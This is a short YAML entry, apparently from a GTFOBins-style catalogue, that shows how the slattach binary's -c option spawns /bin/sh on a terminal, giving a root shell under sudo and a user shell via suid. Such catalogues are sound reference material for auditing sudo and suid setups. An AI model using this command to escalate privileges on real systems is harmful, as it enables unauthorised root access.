---
functions:
  shell:
  - code: |-
      slattach -c /bin/sh -h <tty>
    comment: |-
      Requires root rights. Can be used via suid, but only to get a user shell. "tty" should be a different terminal, e.g. `/dev/pts/0`.
    contexts:
      sudo:
        comment: |-
          Opens a root shell.
      suid:
        comment: |-
          Opens a user shell.
...
